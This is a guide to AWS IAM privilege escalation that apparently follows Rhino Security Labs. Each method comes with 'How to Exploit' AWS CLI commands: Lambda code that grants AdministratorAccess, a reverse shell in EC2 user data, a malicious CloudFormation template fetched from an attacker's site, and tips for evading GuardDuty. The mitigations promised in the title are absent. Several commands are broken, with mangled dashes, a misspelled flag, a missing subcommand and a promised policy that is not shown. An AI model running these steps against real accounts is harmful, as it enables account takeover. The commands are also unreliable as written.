# Privilege Escalation Methods and Mitigations

### Creating a new policy version

**Description:** 

- Attacker with the `iam:CreatePolicyVersion` permission can create a new version of an IAM policy that they have access to. 
- This allows them to define their own custom permissions. 
- When creating a new policy version, it needs to be set as the default version to take effect, which you would think would require the `iam:SetDefaultPolicyVersion` permission, but when creating a new policy version, it is possible to include a flag (–set-as-default) that will automatically create it as the new default version. 
- That flag does not require the `iam:SetDefaultPolicyVersion` permission to use.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default</em></p></blockquote>
<p>Where the policy.json file would include a policy document that allows any action against any resource in the account.</p>

**Potential Impact:**

This privilege escalation method could allow a user to gain full administrator access of the AWS account.</p>

---
### Setting the default policy version to an existing version

**Description:** 
- An attacker with the `iam:SetDefaultPolicyVersion` permission may be able to escalate privileges through existing policy versions that are not currently in use.
- If a policy that they have access to has versions that are not the default, they would be able to change the default version to any other existing version.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam set-default-policy-version –policy-arn target_policy_arn –verion-id v2</em></p></blockquote>
<p>Where “v2” is the policy version with the most privileges available.</p>

**Potential Impact:**

The potential impact is associated with the level of permissions that the inactive policy version has. This could range from no privilege escalation at all to gaining full administrator access to the AWS account, depending on what the inactive policy versions have access to.</p>

---
### Creating an EC2 instance with an existing instance profile

**Description:** 
- An attacker with the `iam:PassRole` and `ec2:RunInstances` permissions can create a new EC2 instance that they will have operating system access to and pass an existing EC2 instance profile/service role to it. 
- They can then login to the instance and request the associated AWS keys from the EC2 instance meta data, which gives them access to all the permissions that the associated instance profile/service role has.

**How to Exploit??**
<p>The attacker can gain access to the instance in a few different ways. One way would be to create/import an SSH key and associated it with the instance on creation, so they can SSH into it. Another way would be to supply a script in the EC2 User Data that would give them access, such as an Empire stager, or even just a reverse shell payload.</p>
<p>Once the instance is running and the user has access to it, they can query the EC2 metadata to retrieve temporary credentials for the associated instance profile, giving them access to any AWS service that the attached role has.</p>
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456</em></p></blockquote>
<p>Where the attacker has access to my_ssh_key and the security group sg-123456 allows SSH access. Another command that could be run that doesn’t require an SSH key or security group allowing SSH access might look like this:</p>
<blockquote><p><em>aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh</em></p></blockquote>
<p>Where the .sh script file contains a script to open a reverse shell in one way or another.</p>
<p>An important note to make about this attack is that an obvious indicator of compromise is when EC2 instance profile credentials are used outside of the specific instance. Even AWS GuardDuty triggers on this (https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types.html#unauthorized11), so it is not a smart move to exfiltrate these credentials and run them locally, but rather access the AWS API from within that EC2 instance.</p>

**Potential Impact:**

This attack would give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.</p>

---
### Creating a new user access key

**Description:** 
- An attacker with the `iam:CreateAccessKey` permission on other users can create an access key ID and secret access key belonging to another user in the AWS environment, if they don’t already have two sets associated with them (which best practice says they shouldn’t).

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam create-access-key –user-name target_user</em></p></blockquote>
<p>Where target_user has an extended set of permissions compared to the current user.</p>

**Potential Impact:**

This method would give an attacker the same level of permissions as any user they were able to create an access key for, which could range from no privilege escalation to full administrator access to the account.</p>

---
### Creating a new login profile

**Description:** 
- An attacker with the `iam:CreateLoginProfile` permission on other users can create a password to use to login to the AWS console on any user that does not already have a login profile setup.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam create-login-profile –user-name target_user –password ‘|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(‘ –no-password-reset-required</em></p></blockquote>
<p>Where target_user has an extended set of permissions compared to the current user and the password is the max possible length (128 characters) with all types of characters (symbols, lowercase, uppercase, numbers) so that you can guarantee that it will meet the accounts minimum password requirements.</p>

**Potential Impact:**

This method would give an attacker the same level of permissions as any user they were able to create a login profile for, which could range from no privilege escalation to full administrator access to the account.</p>

---
### Updating an existing login profile

**Description:** 
- An attacker with the `iam:UpdateLoginProfile` permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.

**How to Exploit??**
<p>Like creating a login profile, an example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam update-login-profile –user-name target_user –password ‘|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(‘ –no-password-reset-required</em></p></blockquote>
<p>Where target_user has an extended set of permissions compared to the current user and the password is the max possible length (128 characters) with all types of characters (symbols, lowercase, uppercase, numbers) so that you can guarantee that it will meet the accounts minimum password requirements.</p>
<p>&nbsp;</p>

**Potential Impact:**

This method would give an attacker the same level of permissions as any user they were able to update the login profile for, which could range from no privilege escalation to full administrator access to the account.</p>
<p>&nbsp;</p>

---
### Attaching a policy to a user

**Description:** 
- An attacker with the `iam:AttachUserPolicy` permission can escalate privileges by attaching a policy to a user that they have access to, adding the permissions of that policy to the attacker.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess</em></p></blockquote>
<p>Where the user name is the current user.</p>

**Potential Impact:**

An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a user, giving them full administrator access to the AWS environment.</p>

---
### Attaching a policy to a group

**Description:** 
- An attacker with the `iam:AttachGroupPolicy` permission can escalate privileges by attaching a policy to a group that they are a part of, adding the permissions of that policy to the attacker.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam attach-group-policy –group-name group_i_am_in –policy-arn arn:aws:iam::aws:policy/AdministratorAccess</em></p></blockquote>
<p>Where the group is a group the current user is a part of.</p>

**Potential Impact:**

An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a group, giving them full administrator access to the AWS environment.</p>

---
### Attaching a policy to a role

**Description:** 
- An attacker with the `iam:AttachRolePolicy` permission can escalate privileges by attaching a policy to a role that they have access to, adding the permissions of that policy to the attacker.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess</em></p></blockquote>
<p>Where the role is a role that the current user can temporarily assume with <u>sts:AssumeRole</u>.</p>

**Potential Impact:**

An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a role, giving them full administrator access to the AWS environment.</p>

---
### Creating/updating an inline policy for a user

**Description:** 
- An attacker with the `iam:PutUserPolicy` permission can escalate privileges by creating or updating an inline policy for a user that they have access to, adding the permissions of that policy to the attacker.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json</em></p></blockquote>
<p>Where the user name is the current user.</p>

**Potential Impact:**

Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.</p>

---
### Creating/updating an inline policy for a group

**Description:** 
- An attacker with the `iam:PutGroupPolicy` permission can escalate privileges by creating or updating an inline policy for a group that they are a part of, adding the permissions of that policy to the attacker.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam put-group-policy –group-name group_i_am_in –policy-name group_inline_policy –policy-document file://path/to/administrator/policy.json</em>&gt;</p></blockquote>
<p>Where the group is a group the current user is in.</p>

**Potential Impact:**

Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.</p>

---
### Creating/updating an inline policy for a role

**Description:** 
- An attacker with the `iam:PutRolePolicy` permission can escalate privileges by creating or updating an inline policy for a role that they have access to, adding the permissions of that policy to the attacker.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam put-role-policy –role-name role_i_can_assume –policy-name role_inline_policy –policy-document file://path/to/administrator/policy.json</em></p></blockquote>
<p>Where the role is a role that the current user can temporarily assume with <u>sts:AssumeRole</u>.</p>

**Potential Impact:**

Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.</p>

---
### Adding a user to a group

**Description:** 
- An attacker with the `iam:AddUserToGroup` permission can use it to add themselves to an existing IAM Group in the AWS account.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam add-user-to-group –group-name target_group –user-name my_username</em></p></blockquote>
<p>Where target_group has more/different privileges than the attacker’s user account.</p>

**Potential Impact:**

The attacker would be able to gain privileges of any existing group in the account, which could range from no privilege escalation to full administrator access to the account.</p>

---
### Updating the AssumeRolePolicyDocument of a role

**Description:** 
- An attacker with the `iam:UpdateAssumeRolePolicy` and `sts:AssumeRole` permissions would be able to change the assume role policy document of any existing role to allow them to assume that role.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json</em></p></blockquote>
<p>Where the policy looks like the following, which gives the user permission to assume the role:</p>

**Potential Impact:**

This would give the attacker the privileges that are attached to any role in the account, which could range from no privilege escalation to full administrator access to the account.</p>

---
### Passing a role to a new Lambda function, then invoking it

**Description:** 
- A user with the `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. 
- The code could then be run by invoking the function through the AWS API.

**How to Exploit??**
<p>An example set of commands to exploit this method might look like this:</p>
<blockquote><p><em>aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py</em></p></blockquote>
<p>Where the code in the python file would utilize the targeted role. An example that uses IAM to attach an administrator policy to the current user can be seen here:</p>
<blockquote><p>import boto3</p>
<p>def lambda_handler(event, context):</p>
<p>client = boto3.client(‘iam’)</p>
<p>response = client.attach_user_policy(</p>
<p>UserName=’my_username’,</p>
<p>PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’</p>
<p>)</p>
<p>return response</p></blockquote>
<p>After this, the attacker would then invoke the Lambda function using the following command:</p>
<blockquote><p><em>aws lambda invoke –function-name my_function output.txt</em></p></blockquote>
<p>Where output.txt is where the results of the invocation will be stored.</p>

**Potential Impact:**

This would give a user access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.</p>


---
### Passing a role to a new Lambda function, then triggering it with DynamoDB

**Description:** 
- A user with the `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` (and possibly `dynamodb:PutItem` and `dynamodb:CreateTable`) permissions, but without the `lambda:InvokeFunction` permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. 
- They then would need to either create a DynamoDB table or use an existing one, to create an event source mapping for the Lambda function pointing to that DynamoDB table. 
- Then they would need to either put an item into the table or wait for another method to do so that the Lambda function will be invoked.

**How to Exploit??**
<p>An example set of commands to exploit this method might look like this:</p>
<blockquote><p><em>aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py</em></p></blockquote>
<p>Where the code in the python file would utilize the targeted role. An example would be the same script used in method 11’s description.</p>
<p>After this, the next step depends on whether DynamoDB is being used in the current AWS environment. If it is being used, all that needs to be done is creating the event source mapping for the Lambda function, but if not, then the attacker will need to create a table with streaming enabled with the following command:</p>
<blockquote><p><em>aws dynamodb create-table –table-name my_table –attribute-definitions AttributeName=Test,AttributeType=S –key-schema AttributeName=Test,KeyType=HASH –provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 –stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES</em></p></blockquote>
<p>After this command, the attacker would connect the Lambda function and the DynamoDB table by creating an event source mapping with the following command:</p>
<blockquote><p><em>aws lambda create-event-source-mapping –function-name my_function –event-source-arn arn_of_dynamodb_table_stream –enabled –starting-position LATEST</em></p></blockquote>
<p>Now that the Lambda function and the stream are connected, the attacker can invoke the Lambda function by triggering the DynamoDB stream. This can be done by putting an item into the DynamoDB table, which will trigger the stream, using the following command:</p>
<blockquote><p><em>aws dynamodb put-item –table-name my_table –item Test={S=”Random string”}</em></p></blockquote>
<p>At this point, the Lambda function will be invoked, and the attacker will be made an administrator of the AWS account.</p>

**Potential Impact:**

This would give an attacker access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.</p>


---
### Updating the code of an existing Lambda function

**Description:** 
- An attacker with the `lambda:UpdateFunctionCode` permission could update the code in an existing Lambda function with an IAM role attached so that it would import the relevant AWS library in that programming language and use it to perform actions on behalf of that role. 
- They would then need to wait for it to be invoked if they were not able to do so directly, but if it already exists, there is likely some way that it will be invoked.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip</em></p></blockquote>
<p>Where the associated .zip file contains code that utilizes the Lambda’s role. An example could include the code snippet from methods 11 and 12.</p>

**Potential Impact:**

This would give an attacker access to the privileges associated with the Lambda service role that is attached to that function, which could range from no privilege escalation to full administrator access to the account.</p>


---
### Passing a role to a Glue Development Endpoint

**Description:** 
- An attacker with the `iam:PassRole` and `glue:CreateDevEndpoint` permissions could create a new AWS Glue development endpoint and pass an existing service role to it. 
- They then could SSH into the instance and use the AWS CLI to have access of the permissions the role has access to.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub</em></p></blockquote>
<p>Now the attacker would just need to SSH into the development endpoint to access the roles credentials. Even though it is not specifically noted in the GuardDuty documentation, like method number 2 (Creating an EC2 instance with an existing instance profile), it would be a bad idea to exfiltrate the credentials from the Glue Instance. Instead, the AWS API should be accessed directly from the new instance.</p>

**Potential Impact:**

This would give an attacker access to the privileges associated with any Glue service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.</p>

---
### Updating an existing Glue Dev Endpoint

**Description:** 
- An attacker with the `glue:UpdateDevEndpoint` permission would be able to update the associated SSH public key of an existing Glue development endpoint, to then SSH into it and have access to the permissions the attached role has access to.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub</em></p></blockquote>
<p>Now the attacker would just need to SSH into the development endpoint to access the roles credentials. Like method number 14, even though it is not specifically noted in the GuardDuty documentation, it would be a bad idea to exfiltrate the credentials from the Glue Instance. Instead, the AWS API should be accessed directly from the new instance.</p>

**Potential Impact:**

This would give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint, which could range from no privilege escalation to full administrator access to the account.</p>

---
### Passing a role to CloudFormation

**Description:** 
- An attacker with the `iam:PassRole` and `cloudformation:CreateStack` permissions would be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating a CloudFormation stack.

**How to Exploit??**
<p>An example command to exploit this method might look like this:</p>
<blockquote><p><em>aws cloudformation create-stack –stack-name my_stack –template-url http://my-website.com/my-malicious-template.template –role-arn arn_of_cloudformation_service_role</em></p></blockquote>
<p>Where the template located at the attacker’s website includes directions to perform malicious actions, such as creating an administrator user and then using those credentials to escalate their own access.</p>
<p>&nbsp;</p>

**Potential Impact:**

This would give an attacker access to the privileges associated with the role that was passed when creating the CloudFormation stack, which could range from no privilege escalation to full administrator access to the account.</p>


---
### Passing a role to Data Pipeline

**Description:** 
- An attacker with the `iam:PassRole`, `datapipeline:CreatePipeline`, and `datapipeline:PutPipelineDefinition` permissions would be able to escalate privileges by creating a pipeline and updating it to run an arbitrary AWS CLI command or create other resources, either once or on an interval with the permissions of the role that was passed in.

**How to Exploit??**
<p>Some example commands to exploit this method might look like these:</p>
<blockquote><p><em>aws datapipeline create-pipeline –name my_pipeline –unique-id unique_string</em></p></blockquote>
<p>Which will create an empty pipeline. The attacker then needs to update the definition of the pipeline to tell it what to do, with a command like this:</p>
<blockquote><p><em>aws datapipeline put-pipeline-definition –pipeline-id unique_string –pipeline-definition file://path/to/my/pipeline/definition.json</em></p></blockquote>
<p>Where the pipeline definition file contains a directive to run a command or create resources using the AWS API that could help the attacker gain additional privileges.</p>

**Potential Impact:**

This would give the attacker access to the privileges associated with the role that was passed when creating the pipeline, which could range from no privilege escalation to full administrator access to the account.</p>

---

Ref => [Rhino Security Labs](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
